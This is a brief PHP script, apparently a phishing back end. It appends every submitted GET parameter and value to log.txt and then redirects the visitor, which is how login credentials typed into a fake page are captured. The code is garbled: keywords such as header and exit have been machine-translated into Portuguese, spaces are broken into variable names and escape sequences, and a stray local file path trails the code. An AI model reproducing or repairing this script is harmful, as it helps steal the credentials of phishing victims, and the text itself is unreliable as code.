<? Php

cabeçalho (‘Localização: destino’);

$ handle = fopen (“log.txt”, “a”);

foreach ($ _ GET as $ variable => $ value) {

fwrite ($ handle, $ variable);

fwrite ($ handle, “=”);

fwrite ($ handle, $ value);
fwrite ($ handle, “\ r \ n”);

}

fwrite ($ handle, “\ r \ n”);

fclose ($ handle);

saída;

?>location:file:///C:/Users/usuario/Desktop/index.html